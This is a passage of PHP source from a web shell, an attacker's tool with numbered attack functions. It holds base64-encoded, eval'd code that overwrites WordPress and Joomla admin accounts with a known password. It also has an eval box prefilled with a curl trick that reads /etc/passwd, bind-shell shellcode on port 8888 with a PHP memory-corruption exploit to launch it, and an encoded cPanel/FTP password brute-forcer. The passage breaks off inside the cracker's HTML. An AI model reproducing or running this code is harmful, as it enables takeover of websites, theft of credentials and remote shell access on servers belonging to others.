ID0gMSIpIG9yIGRpZShteXNxbF9lcnJvcigpKTsKJGE0cz1AbXlzcWxfcXVlcnkoIlVQREFURSB3
cF91c2VycyBTRVQgdXNlcl9wYXNzID0nIi4kaGFzaC4iJyBXSEVSRSBJRCA9IDEiKSBvciBkaWUo
bXlzcWxfZXJyb3IoKSk7CiRhNHM9QG15c3FsX3F1ZXJ5KCJVUERBVEUgd3BfdXNlcnMgU0VUIHVz
ZXJfbG9naW4gPSciLiRhZG1pbi4iJyBXSEVSRSBJRCA9IDIiKSBvciBkaWUobXlzcWxfZXJyb3Io
KSk7CiRhNHM9QG15c3FsX3F1ZXJ5KCJVUERBVEUgd3BfdXNlcnMgU0VUIHVzZXJfcGFzcyA9JyIu
JGhhc2guIicgV0hFUkUgSUQgPSAyIikgb3IgZGllKG15c3FsX2Vycm9yKCkpOwokYTRzPUBteXNx
bF9xdWVyeSgiVVBEQVRFIHdwX3VzZXJzIFNFVCB1c2VyX2xvZ2luID0nIi4kYWRtaW4uIicgV0hF
UkUgSUQgPSAzIikgb3IgZGllKG15c3FsX2Vycm9yKCkpOwokYTRzPUBteXNxbF9xdWVyeSgiVVBE
QVRFIHdwX3VzZXJzIFNFVCB1c2VyX3Bhc3MgPSciLiRoYXNoLiInIFdIRVJFIElEID0gMyIpIG9y
IGRpZShteXNxbF9lcnJvcigpKTsKJGE0cz1AbXlzcWxfcXVlcnkoIlVQREFURSB3cF91c2VycyBT
RVQgdXNlcl9lbWFpbCA9JyIuJFNRTC4iJyBXSEVSRSBJRCA9IDEiKSBvciBkaWUobXlzcWxfZXJy
b3IoKSk7CgoKaWYoJGE0cyl7CmVjaG8gIjxiPiBTdWNjZXNzIDpOb3cgVXNlIEEgTmV3IFVzZXIg
QW5kIFBhc3MgVG8gbG9naW4gSW4gVGhlIEFkbWluIFBhbmVsPC9iPiAiOwp9Cgp9"));
break;
case "PHP_23":
eval(base64_decode("aWYoZW1wdHkoJF9QT1NUWydwd2QnXSkpewplY2hvICI8Rk9STSBtZXRob2Q9XCJQT1NUXCI+Cmhv
c3QgOiA8SU5QVVQgc2l6ZT1cIjE1XCIgdmFsdWU9XCJsb2NhbGhvc3RcIiBuYW1lPVwibG9jYWxo
b3N0XCIgdHlwZT1cInRleHRcIj4KZGF0YWJhc2UgOiA8SU5QVVQgc2l6ZT1cIjE1XCIgdmFsdWU9
XCJkYXRhYmFzZVwiIG5hbWU9XCJkYXRhYmFzZVwiIHR5cGU9XCJ0ZXh0XCI+PGJyPgp1c2VybmFt
ZSA6IDxJTlBVVCBzaXplPVwiMTVcIiB2YWx1ZT1cImRiX3VzZXJcIiBuYW1lPVwidXNlcm5hbWVc
IiB0eXBlPVwidGV4dFwiPgpwYXNzd29yZCA6IDxJTlBVVCBzaXplPVwiMTVcIiB2YWx1ZT1cIioq
XCIgbmFtZT1cInBhc3N3b3JkXCIgdHlwZT1cInBhc3N3b3JkXCI+PGJyPgogIDxicj4KU2V0IEEg
TmV3IHVzZXJuYW1lIEZvciBMb2dpbiA6IDxJTlBVVCBuYW1lPVwiYWRtaW5cIiBzaXplPVwiMTVc
IiB2YWx1ZT1cImFkbWluXCI+PGJyPgpEb25gdCBDaGFuZ2UgaXQgUGFzc3dvcmQgaXMgOiAxMjM0
NTY6IDxJTlBVVCBuYW1lPVwicHdkXCIgc2l6ZT1cIjE1XCIgdmFsdWU9XCJlMTBhZGMzOTQ5YmE1
OWFiYmU1NmUwNTdmMjBmODgzZVwiPjxicj4KCjxJTlBVVCB2YWx1ZT1cImNoYW5nZVwiIG5hbWU9
XCJzZW5kXCIgdHlwZT1cInN1Ym1pdFwiPgo8L0ZPUk0+IjsKfWVsc2V7CiRsb2NhbGhvc3QgPSAk
X1BPU1RbJ2xvY2FsaG9zdCddOwokZGF0YWJhc2UgID0gJF9QT1NUWydkYXRhYmFzZSddOwokdXNl
cm5hbWUgID0gJF9QT1NUWyd1c2VybmFtZSddOwokcGFzc3dvcmQgID0gJF9QT1NUWydwYXNzd29y
ZCddOwokcHdkICAgPSAkX1BPU1RbJ3B3ZCddOwokYWRtaW4gPSAkX1BPU1RbJ2FkbWluJ107CkBt
eXNxbF9jb25uZWN0KCRsb2NhbGhvc3QsJHVzZXJuYW1lLCRwYXNzd29yZCkgb3IgZGllKG15c3Fs
X2Vycm9yKCkpOwpAbXlzcWxfc2VsZWN0X2RiKCRkYXRhYmFzZSkgb3IgZGllKG15c3FsX2Vycm9y
KCkpOwokaGFzaCA9IGNyeXB0KCRwd2QpOwokU1FMPUBteXNxbF9xdWVyeSgiVVBEQVRFIGpvc191
c2VycyBTRVQgdXNlcm5hbWUgPSciLiRhZG1pbi4iJyBXSEVSRSBJRCA9IDYyIikgb3IgZGllKG15
c3FsX2Vycm9yKCkpOwokU1FMPUBteXNxbF9xdWVyeSgiVVBEQVRFIGpvc191c2VycyBTRVQgcGFz
c3dvcmQgPSciLiRwd2QuIicgV0hFUkUgSUQgPSA2MiIpIG9yIGRpZShteXNxbF9lcnJvcigpKTsK
JFNRTD1AbXlzcWxfcXVlcnkoIlVQREFURSBqb3NfdXNlcnMgU0VUIHVzZXJuYW1lID0nIi4kYWRt
aW4uIicgV0hFUkUgSUQgPSA2MyIpIG9yIGRpZShteXNxbF9lcnJvcigpKTsKJFNRTD1AbXlzcWxf
cXVlcnkoIlVQREFURSBqb3NfdXNlcnMgU0VUIHBhc3N3b3JkID0nIi4kcHdkLiInIFdIRVJFIElE
ID0gNjMiKSBvciBkaWUobXlzcWxfZXJyb3IoKSk7CiRTUUw9QG15c3FsX3F1ZXJ5KCJVUERBVEUg
am9zX3VzZXJzIFNFVCB1c2VybmFtZSA9JyIuJGFkbWluLiInIFdIRVJFIElEID0gNjQiKSBvciBk
aWUobXlzcWxfZXJyb3IoKSk7CiRTUUw9QG15c3FsX3F1ZXJ5KCJVUERBVEUgam9zX3VzZXJzIFNF
VCBwYXNzd29yZCA9JyIuJHB3ZC4iJyBXSEVSRSBJRCA9IDY0Iikgb3IgZGllKG15c3FsX2Vycm9y
KCkpOwokU1FMPUBteXNxbF9xdWVyeSgiVVBEQVRFIGpvc191c2VycyBTRVQgdXNlcm5hbWUgPSci
LiRhZG1pbi4iJyBXSEVSRSBJRCA9IDY1Iikgb3IgZGllKG15c3FsX2Vycm9yKCkpOwokU1FMPUBt
eXNxbF9xdWVyeSgiVVBEQVRFIGpvc191c2VycyBTRVQgcGFzc3dvcmQgPSciLiRwd2QuIicgV0hF
UkUgSUQgPSA2NSIpIG9yIGRpZShteXNxbF9lcnJvcigpKTsKaWYoJFNRTCl7CmVjaG8gIjxiPlN1
Y2Nlc3MgOk5vdyBVc2UgQSBOZXcgVXNlciBBbmQgUGFzc3dvcmQgLSAoMTIzNDU2KSI7Cn0KfQ==
"));
break;
case "PHP_24":
� � $code=stripslashes($_POST['code']);
� � echo '<center><br><h3> PHP Code Evaluating </h3></center>
� � <center>
� � <form method="POST" action="">
� � <input type="hidden" name="id" value="eval">
� � <textarea name ="code" rows="10" cols="85"
class="textarea">',$code,'mkDIR("file:");
chdir("file:");
mkDIR("etc");
chdir("etc");
mkDIR("passwd");
chdir("..");
chdir("..");

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "file:file:///etc/passwd");
curl_setopt($ch, CURLOPT_HEADER, 0);

curl_exec($ch);

curl_close($ch);</textarea><br><br>
� � <input type="submit" value=" Evaluate PHP Code" class="button"><hr>
� � </form>
� � <textarea rows="10" cols="85" class="textarea">';
� � eval($code);
� � echo '</textarea><br><br>';
break;
case "PHP_25":
� �$shellcode = "\x6a\x66\x58\x6a\x01\x5b\x99\x52\x53\x6a\x02\x89".

� � � � � � � � "\xe1\xcd\x80\x52\x43\x68\xff\x02".

� � � � � � � � "\x22\xb8". //port (8888)

� � � � � � � � "\x89\xe1".

� � � � � � � � "\x6a\x10\x51\x50\x89\xe1\x89\xc6\xb0\x66\xcd\x80".

� � � � � � � � "\x43\x43\xb0\x66\xcd\x80\x52\x56\x89\xe1\x43\xb0".

� � � � � � � � "\x66\xcd\x80\x89\xd9\x89\xc3\xb0\x3f\x49\xcd\x80".

� � � � � � � � "\x41\xe2\xf8\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f".

� � � � � � � � "\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80";



� $________________________str = str_repeat("A", 39);

� $________________________yyy = &$________________________str;

� $________________________xxx = &$________________________str;

� for ($i = 0; $i < 65534; $i++) $arr[] = &$________________________str;

� $________________________aaa = " � XXXXX � ";

� $________________________aab = " XXXx.xXXX ";

� $________________________aac = " XXXx.xXXX ";

� $________________________aad = " � XXXXX � ";

� unset($________________________xxx);

� unset($________________________aaa);

� unset($________________________aab);

� unset($________________________aac);

� unset($________________________aad);

� $arr = array($shellcode => 1);



� $addr = unpack("L", substr($________________________str, 6*4, 4));

� $addr = $addr[1] + 32;

� $addr = pack("L", $addr);



� for ($i=0; $i<strlen($addr); $i++) {

� � $________________________str[8*4+$i] = $addr[$i];

� � $________________________yyy[8*4+$i] = $addr[$i];

� }

� unset($arr);
break;
case "PHP_26":

$crackftp = 'PD9waHAKJGNwYW5lbF9wb3J0PSIyMDgyIjsKJGNvbm5lY3RfdGltZW91dD01OwpzZXRfdGltZV9s
aW1pdCgwKTsKJHN1Ym1pdD0kX1JFUVVFU1RbJ3N1Ym1pdCddOwokdXNlcnM9JF9SRVFVRVNUWyd1
c2VycyddOwokcGFzcz0kX1JFUVVFU1RbJ3Bhc3N3b3JkcyddOwokdGFyZ2V0PSRfUkVRVUVTVFsn
dGFyZ2V0J107CiRjcmFja3R5cGU9JF9SRVFVRVNUWydjcmFja3R5cGUnXTsKaWYoJHRhcmdldCA9
PSAiIil7CiR0YXJnZXQgPSAibG9jYWxob3N0IjsKfQokY2hhcnNldD0kX1JFUVVFU1RbJ2NoYXJz
ZXQnXTsKaWYoJGNoYXJzZXQ9PSIiKQogJGNoYXJzZXQ9Imxvd2VyY2FzZSI7CiRtYXhfbGVuZ3Ro
PSRfUkVRVUVTVFsnbWF4X2xlbmd0aCddOwppZigkbWF4X2xlbmd0aD09IiIpCiAkbWF4X2xlbmd0
aD0xMDsKJG1pbl9sZW5ndGg9JF9SRVFVRVNUWydtaW5fbGVuZ3RoJ107CmlmKCRtaW5fbGVuZ3Ro
PT0iIikKICRtaW5fbGVuZ3RoPTE7CgogJGNoYXJzZXRhbGwgPSBhcnJheSgiYSIsICJiIiwgImMi
LCAiZCIsICJlIiwgImYiLCAiZyIsICJoIiwgImkiLCAiaiIsICJrIiwgImwiLCAibSIsICJuIiwg
Im8iLCAicCIsICJxIiwgInIiLCAicyIsICJ0IiwgInUiLCAidiIsICJ3IiwgIngiLCAieSIsICJ6
IiwgIkEiLCAiQiIsICJDIiwgIkQiLCAiRSIsICJGIiwgIkciLCAiSCIsICJJIiwgIkoiLCAiSyIs
ICJMIiwgIk0iLCAiTiIsICJPIiwgIlAiLCAiUSIsICJSIiwgIlMiLCAiVCIsICJVIiwgIlYiLCAi
VyIsICJYIiwgIlkiLCAiWiIsICIwIiwgIjEiLCAiMiIsICIzIiwgIjQiLCAiNSIsICI2IiwgIjci
LCAiOCIsICI5Iik7CiAkY2hhcnNldGxvd2VyID0gYXJyYXkoImEiLCAiYiIsICJjIiwgImQiLCAi
ZSIsICJmIiwgImciLCAiaCIsICJpIiwgImoiLCAiayIsICJsIiwgIm0iLCAibiIsICJvIiwgInAi
LCAicSIsICJyIiwgInMiLCAidCIsICJ1IiwgInYiLCAidyIsICJ4IiwgInkiLCAieiIpOwogJGNo
YXJzZXR1cHBlciA9IGFycmF5KCJBIiwgIkIiLCAiQyIsICJEIiwgIkUiLCAiRiIsICJHIiwgIkgi
LCAiSSIsICJKIiwgIksiLCAiTCIsICJNIiwgIk4iLCAiTyIsICJQIiwgIlEiLCAiUiIsICJTIiwg
IlQiLCAiVSIsICJWIiwgIlciLCAiWCIsICJZIiwgIloiKTsKICRjaGFyc2V0bnVtZXJpYyA9IGFy
cmF5KCIwIiwgIjEiLCAiMiIsICIzIiwgIjQiLCAiNSIsICI2IiwgIjciLCAiOCIsICI5Iik7CiAk
Y2hhcnNldGxvd2VybnVtZXJpYyA9IGFycmF5KCJhIiwgImIiLCAiYyIsICJkIiwgImUiLCAiZiIs
ICJnIiwgImgiLCAiaSIsICJqIiwgImsiLCAibCIsICJtIiwgIm4iLCAibyIsICJwIiwgInEiLCAi
ciIsICJzIiwgInQiLCAidSIsICJ2IiwgInciLCAieCIsICJ5IiwgInoiLCAiMCIsICIxIiwgIjIi
LCAiMyIsICI0IiwgIjUiLCAiNiIsICI3IiwgIjgiLCAiOSIpOwogJGNoYXJzZXR1cHBlcm51bWVy
aWMgPSBhcnJheSgiQSIsICJCIiwgIkMiLCAiRCIsICJFIiwgIkYiLCAiRyIsICJIIiwgIkkiLCAi
SiIsICJLIiwgIkwiLCAiTSIsICJOIiwgIk8iLCAiUCIsICJRIiwgIlIiLCAiUyIsICJUIiwgIlUi
LCAiViIsICJXIiwgIlgiLCAiWSIsICJaIiwgIjAiLCAiMSIsICIyIiwgIjMiLCAiNCIsICI1Iiwg
IjYiLCAiNyIsICI4IiwgIjkiKTsKICRjaGFyc2V0bGV0dGVycyA9IGFycmF5KCJhIiwgImIiLCAi
YyIsICJkIiwgImUiLCAiZiIsICJnIiwgImgiLCAiaSIsICJqIiwgImsiLCAibCIsICJtIiwgIm4i
LCAibyIsICJwIiwgInEiLCAiciIsICJzIiwgInQiLCAidSIsICJ2IiwgInciLCAieCIsICJ5Iiwg
InoiLCAiQSIsICJCIiwgIkMiLCAiRCIsICJFIiwgIkYiLCAiRyIsICJIIiwgIkkiLCAiSiIsICJL
IiwgIkwiLCAiTSIsICJOIiwgIk8iLCAiUCIsICJRIiwgIlIiLCAiUyIsICJUIiwgIlUiLCAiViIs
ICJXIiwgIlgiLCAiWSIsICJaIiApOwogJGNoYXJzZXRzeW1ib2xzPSBhcnJheSgiISIsICJAIiwg
IiMiLCAiJCIsICIlIiwgIl4iLCAiJiIsICIqIiwgIigiLCAiKSIsIl8iICk7CiAkY2hhcnNldGxv
d2Vyc3ltYm9scyA9IGFycmF5KCJhIiwgImIiLCAiYyIsICJkIiwgImUiLCAiZiIsICJnIiwgImgi
LCAiaSIsICJqIiwgImsiLCAibCIsICJtIiwgIm4iLCAibyIsICJwIiwgInEiLCAiciIsICJzIiwg
InQiLCAidSIsICJ2IiwgInciLCAieCIsICJ5IiwgInoiLCIhIiwgIkAiLCAiIyIsICIkIiwgIiUi
LCAiXiIsICImIiwgIioiLCAiKCIsICIpIiwiXyIgKTsKICRjaGFyc2V0dXBwZXJzeW1ib2xzID0g
YXJyYXkoIkEiLCAiQiIsICJDIiwgIkQiLCAiRSIsICJGIiwgIkciLCAiSCIsICJJIiwgIkoiLCAi
SyIsICJMIiwgIk0iLCAiTiIsICJPIiwgIlAiLCAiUSIsICJSIiwgIlMiLCAiVCIsICJVIiwgIlYi
LCAiVyIsICJYIiwgIlkiLCAiWiIsIiEiLCAiQCIsICIjIiwgIiQiLCAiJSIsICJeIiwgIiYiLCAi
KiIsICIoIiwgIikiLCJfIiApOwogJGNoYXJzZXRsZXR0ZXJzc3ltYm9scyA9IGFycmF5KCJhIiwg
ImIiLCAiYyIsICJkIiwgImUiLCAiZiIsICJnIiwgImgiLCAiaSIsICJqIiwgImsiLCAibCIsICJt
IiwgIm4iLCAibyIsICJwIiwgInEiLCAiciIsICJzIiwgInQiLCAidSIsICJ2IiwgInciLCAieCIs
ICJ5IiwgInoiLCAiQSIsICJCIiwgIkMiLCAiRCIsICJFIiwgIkYiLCAiRyIsICJIIiwgIkkiLCAi
SiIsICJLIiwgIkwiLCAiTSIsICJOIiwgIk8iLCAiUCIsICJRIiwgIlIiLCAiUyIsICJUIiwgIlUi
LCAiViIsICJXIiwgIlgiLCAiWSIsICJaIiwiISIsICJAIiwgIiMiLCAiJCIsICIlIiwgIl4iLCAi
JiIsICIqIiwgIigiLCAiKSIsIl8iICk7CiAkY2hhcnNldG51bWVyaWNzeW1ib2xzID0gYXJyYXko
IjAiLCAiMSIsICIyIiwgIjMiLCAiNCIsICI1IiwgIjYiLCAiNyIsICI4IiwgIjkiLCIhIiwgIkAi
LCAiIyIsICIkIiwgIiUiLCAiXiIsICImIiwgIioiLCAiKCIsICIpIiwiXyIgKTsKICRjaGFyc2V0
bG93ZXJudW1lcmljc3ltYm9scyA9IGFycmF5KCJhIiwgImIiLCAiYyIsICJkIiwgImUiLCAiZiIs
ICJnIiwgImgiLCAiaSIsICJqIiwgImsiLCAibCIsICJtIiwgIm4iLCAibyIsICJwIiwgInEiLCAi
ciIsICJzIiwgInQiLCAidSIsICJ2IiwgInciLCAieCIsICJ5IiwgInoiLCAiMCIsICIxIiwgIjIi
LCAiMyIsICI0IiwgIjUiLCAiNiIsICI3IiwgIjgiLCAiOSIsIiEiLCAiQCIsICIjIiwgIiQiLCAi
JSIsICJeIiwgIiYiLCAiKiIsICIoIiwgIikiLCJfIiApOwogJGNoYXJzZXR1cHBlcm51bWVyaWNz
eW1ib2xzID0gYXJyYXkoIkEiLCAiQiIsICJDIiwgIkQiLCAiRSIsICJGIiwgIkciLCAiSCIsICJJ
IiwgIkoiLCAiSyIsICJMIiwgIk0iLCAiTiIsICJPIiwgIlAiLCAiUSIsICJSIiwgIlMiLCAiVCIs
ICJVIiwgIlYiLCAiVyIsICJYIiwgIlkiLCAiWiIsICIwIiwgIjEiLCAiMiIsICIzIiwgIjQiLCAi
NSIsICI2IiwgIjciLCAiOCIsICI5IiwiISIsICJAIiwgIiMiLCAiJCIsICIlIiwgIl4iLCAiJiIs
ICIqIiwgIigiLCAiKSIsIl8iICk7CiAkY2hhcnNldGxldHRlcnNzeW1ib2xzID0gYXJyYXkoImEi
LCAiYiIsICJjIiwgImQiLCAiZSIsICJmIiwgImciLCAiaCIsICJpIiwgImoiLCAiayIsICJsIiwg
Im0iLCAibiIsICJvIiwgInAiLCAicSIsICJyIiwgInMiLCAidCIsICJ1IiwgInYiLCAidyIsICJ4
IiwgInkiLCAieiIsICJBIiwgIkIiLCAiQyIsICJEIiwgIkUiLCAiRiIsICJHIiwgIkgiLCAiSSIs
ICJKIiwgIksiLCAiTCIsICJNIiwgIk4iLCAiTyIsICJQIiwgIlEiLCAiUiIsICJTIiwgIlQiLCAi
VSIsICJWIiwgIlciLCAiWCIsICJZIiwgIloiICwiISIsICJAIiwgIiMiLCAiJCIsICIlIiwgIl4i
LCAiJiIsICIqIiwgIigiLCAiKSIsIl8iICk7CiAkY2hhcnNldGxldHRlcnNudW1lcmljc3ltYm9s
cz1hcnJheSgiYSIsICJiIiwgImMiLCAiZCIsICJlIiwgImYiLCAiZyIsICJoIiwgImkiLCAiaiIs
ICJrIiwgImwiLCAibSIsICJuIiwgIm8iLCAicCIsICJxIiwgInIiLCAicyIsICJ0IiwgInUiLCAi
diIsICJ3IiwgIngiLCAieSIsICJ6IiwgIkEiLCAiQiIsICJDIiwgIkQiLCAiRSIsICJGIiwgIkci
LCAiSCIsICJJIiwgIkoiLCAiSyIsICJMIiwgIk0iLCAiTiIsICJPIiwgIlAiLCAiUSIsICJSIiwg
IlMiLCAiVCIsICJVIiwgIlYiLCAiVyIsICJYIiwgIlkiLCAiWiIgLCIhIiwgIkAiLCAiIyIsICIk
IiwgIiUiLCAiXiIsICImIiwgIioiLCAiKCIsICIpIiwiXyIsIjAiLCAiMSIsICIyIiwgIjMiLCAi
NCIsICI1IiwgIjYiLCAiNyIsICI4IiwgIjkiICk7CglpZiAoJGNoYXJzZXQgPT0gImFsbCIpCgkJ
JHZhbHMgPSAkY2hhcnNldGFsbDsKICAgIGVsc2VpZiAoJGNoYXJzZXQgPT0gImxvd2VyY2FzZSIp
IAoJCSR2YWxzID0gJGNoYXJzZXRsb3dlcjsKCSBlbHNlaWYgKCRjaGFyc2V0ID09ICJ1cHBlcmNh
c2UiKSAKCQkkdmFscyA9ICRjaGFyc2V0dXBwZXI7CgkgZWxzZWlmICgkY2hhcnNldCA9PSAibnVt
ZXJpYyIpIAoJCSR2YWxzID0gJGNoYXJzZXRudW1lcmljOwoJIGVsc2VpZiAoJGNoYXJzZXQgPT0g
Imxvd2VybnVtZXJpYyIpIAoJCSR2YWxzID0gJGNoYXJzZXRsb3dlcm51bWVyaWM7CgkgZWxzZWlm
ICgkY2hhcnNldCA9PSAidXBwZXJudW1lcmljIikgCgkJJHZhbHMgPSAkY2hhcnNldHVwcGVybnVt
ZXJpYzsKCWVsc2VpZiAoJGNoYXJzZXQgPT0gImxldHRlcnMiKSAKCQkkdmFscyA9ICRjaGFyc2V0
bGV0dGVyczsKCWVsc2VpZiAoJGNoYXJzZXQgPT0gInN5bWJvbHMiKSAKCQkkdmFscyA9ICRjaGFy
c2V0c3ltYm9sczsKCWVsc2VpZiAoJGNoYXJzZXQgPT0gImxvd2Vyc3ltYm9scyIpIAoJCSR2YWxz
ID0gJGNoYXJzZXRsb3dlcnN5bWJvbHM7CgllbHNlaWYgKCRjaGFyc2V0ID09ICJ1cHBlcnN5bWJv
bHMiKSAKCQkkdmFscyA9ICRjaGFyc2V0dXBwZXJzeW1ib2xzOwoJZWxzZWlmICgkY2hhcnNldCA9
PSAibGV0dGVyc3N5bWJvbHMiKSAKCQkkdmFscyA9ICRjaGFyc2V0bGV0dGVyc3N5bWJvbHM7Cgll
bHNlaWYgKCRjaGFyc2V0ID09ICJudW1iZXJzc3ltYm9scyIpIAoJCSR2YWxzID0gJGNoYXJzZXRu
dW1lcmljc3ltYm9sczsKCWVsc2VpZiAoJGNoYXJzZXQgPT0gImxvd2VybnVtZXJpY3N5bWJvbHMi
KSAKCQkkdmFscyA9ICRjaGFyc2V0bG93ZXJudW1lcmljc3ltYm9sczsKCWVsc2VpZiAoJGNoYXJz
ZXQgPT0gInVwcGVybnVtZXJpY3N5bWJvbHMiKSAKCQkkdmFscyA9ICRjaGFyc2V0dXBwZXJudW1l
cmljc3ltYm9sczsKCWVsc2VpZiAoJGNoYXJzZXQgPT0gImxldHRlcnNudW1lcmljc3ltYm9scyIp
IAoJCSR2YWxzID0gJGNoYXJzZXRsZXR0ZXJzbnVtZXJpY3N5bWJvbHM7CgllbHNlIGVjaG8gIklO
VkFMSUQgQ0hBUlNFVCI7Cgkka2V5X3RoYXRfc2NyaXB0X2lzX2NyeXB0ZWQ9MTk7CiRyZXNvdXJj
ZV9jcnlwdGVkX2NvZGUgPSceGTd+YDMuMzdMQFZBRVZBSDFAVkFFVkFMXVJeVjFOPTdMQFZBRVZB
SDFAUEFaQ0dMXVJeVjFOKB4ZN2BmcTMuMzFAe3Z/fzMtLTMpMzEzPTM3fmAoHhk3fDMuM3JhYXJq
MzsxfH4xPzFnfnJ6MT8xeUxyfmEiMT8xU3t8MT8xfz1wMTooHhk3dnYzLjM3fEghTj03fEggTj03
fEgiTj03fEhbdDNdTj03fEgjTigeGTdgdn13My4zU35yen87N3Z2PzdgZnE/N35gOigzHhknOwok
c3RyaW5nX291dHB1dD1zdHJfcmVwbGFjZSgiW3QxXSIsICI8PyIsICRyZXNvdXJjZV9jcnlwdGVk
X2NvZGUpOwokc3RyaW5nX291dHB1dD1zdHJfcmVwbGFjZSgiW3QzXSIsICInIiwgJHN0cmluZ19v
dXRwdXQpOwokbGVudGhfb2ZfY3J5cHRlZF9jb2RlPXN0cmxlbigkc3RyaW5nX291dHB1dCk7CiRl
dmFsX3BocF9jb2RlPScnOwpmb3IoJGh1aXZhbXZzZW09MDskaHVpdmFtdnNlbTwkbGVudGhfb2Zf
Y3J5cHRlZF9jb2RlOyRodWl2YW12c2VtKyspCiRldmFsX3BocF9jb2RlIC49IGNocihvcmQoJHN0
cmluZ19vdXRwdXRbJGh1aXZhbXZzZW1dKSBeICRrZXlfdGhhdF9zY3JpcHRfaXNfY3J5cHRlZCk7
CmV2YWwoJGV2YWxfcGhwX2NvZGUpOwo/Pgo8aHRtbD4KPGhlYWQ+CjxtZXRhIGh0dHAtZXF1aXY9
IkNvbnRlbnQtTGFuZ3VhZ2UiIGNvbnRlbnQ9ImVuLXVzIj4KPC9oZWFkPgo8dGl0bGU+Q3BhbmVs
ICwgRlRQIENyYUNrZVI8L3RpdGxlPgo8Ym9keSB0ZXh0PSIjMDBGRjAwIiBiZ2NvbG9yPSIjMDAw
MDAwIiB2bGluaz0iIzAwODAwMCIgbGluaz0iIzAwODAwMCIgYWxpbms9IiMwMDgwMDAiPgo8ZGl2
IGFsaWduPSJjZW50ZXIiPgo8Zm9ybSBtZXRob2Q9IlBPU1QiIHN0eWxlPSJib3JkZXI6IDFweCBz
b2xpZCAjMDAwMDAwIj4KICAgICAgICA8aW1nIGJvcmRlcj0iMCIgc3JjPSJodHRwOi8vd3d3LmFs
bTNyZWZoLmNvbS91cGxvYWQvZ3JvdXAvZ3JvdXB4cC5naWYiIHdpZHRoPSI0MjYiIGhlaWdodD0i
MTY5Ij48dGFibGUgYm9yZGVyPSIxIiB3aWR0aD0iNjclIiBib3JkZXJjb2xvcmxpZ2h0PSIjMDA4
MDAwIiBib3JkZXJjb2xvcmRhcms9IiMwMDM3MDAiPgogICAgICAgICAgICAgICAgPHRyPgogICAg
ICAgICAgICAgICAgICAgICAgICA8dGQ+CiAgICAgICAgPHAgYWxpZ249ImNlbnRlciI+PGI+PGZv
bnQgY29sb3I9IiMwMDgwMDAiIGZhY2U9IlRhaG9tYSIgc2l6ZT0iMiI+CiAgICAgICAgICAgICAg
ICA8c3BhbiBsYW5nPSJlbi11cyI+SVAgc2VydmVyPC9zcGFuPiA6PC9mb250Pjxmb250IGZhY2U9
IkFyaWFsIj4KICAgICAgICA8L2ZvbnQ+PGZvbnQgZmFjZT0iQXJpYWwiIGNvbG9yPSIjQ0MwMDAw
Ij4KICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0idGFyZ2V0IiBzaXplPSIxNiIgdmFs
dWU9Ijw/cGhwIGVjaG8gJHRhcmdldCA/PiIgc3R5bGU9ImJvcmRlcjogMnB4IHNvbGlkICMxRDFE
MUQ7IGJhY2tncm91bmQtY29sb3I6ICMwMDAwMDA7IGNvbG9yOiMwMDgwMDA7IGZvbnQtZmFtaWx5
OlZlcmRhbmE7IGZvbnQtd2VpZ2h0OmJvbGQ7IGZvbnQtc2l6ZToxM3B4Ij48L2ZvbnQ+PC9iPjwv
cD4KICAgICAgICA8cCBhbGlnbj0iY2VudGVyIj48Yj48Zm9udCBjb2xvcj0iIzAwODAwMCIgZmFj
ZT0iVGFob21hIiBzaXplPSIyIj4mbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsm
bmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJz
cDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsg
PC9mb250PjwvYj48L3A+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgYWxpZ249ImNlbnRl
ciI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRhYmxlIGJvcmRlcj0iMSIgd2lk
dGg9IjU3JSIgYm9yZGVyY29sb3JsaWdodD0iIzAwODAwMCIgYm9yZGVyY29sb3JkYXJrPSIjMDAz
NzAwIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0cj4KICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRkIGFsaWduPSJjZW50
ZXIiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c3BhbiBsYW5nPSJl
bi11cyI+PGZvbnQgY29sb3I9IiNGRjAwMDAiPjxiPlVzZXIgTGlzdDwvYj48L2ZvbnQ+PC9zcGFu
PjwvdGQ+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0
ZD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHAgYWxp
Z249ImNlbnRlciI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzcGFu
IGxhbmc9ImVuLXVzIj48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+PGI+UGFzc3dvcmQgTGlzdDwvYj48
L2ZvbnQ+PC9zcGFuPjwvdGQ+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICA8L3RyPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvdGFibGU+CgogICAgICAg
ICAgICAgICAgICAgICAgICA8cCBhbGlnbj0iY2VudGVyIj4mbmJzcDs8dGV4dGFyZWEgcm93cz0i
MjAiIG5hbWU9InVzZXJzIiBjb2xzPSIyNSIgc3R5bGU9ImJvcmRlcjogMnB4IHNvbGlkICMxRDFE
MUQ7IGJhY2tncm91bmQtY29sb3I6ICMwMDAwMDA7IGNvbG9yOiNDMEMwQzAiPjw/cGhwIGVjaG8g
JHVzZXJzID8+CjwvdGV4dGFyZWE+PHRleHRhcmVhIHJvd3M9IjIwIiBuYW1lPSJwYXNzd29yZHMi
IGNvbHM9IjI1IiBzdHlsZT0iYm9yZGVyOiAycHggc29saWQgIzFEMUQxRDsgYmFja2dyb3VuZC1j
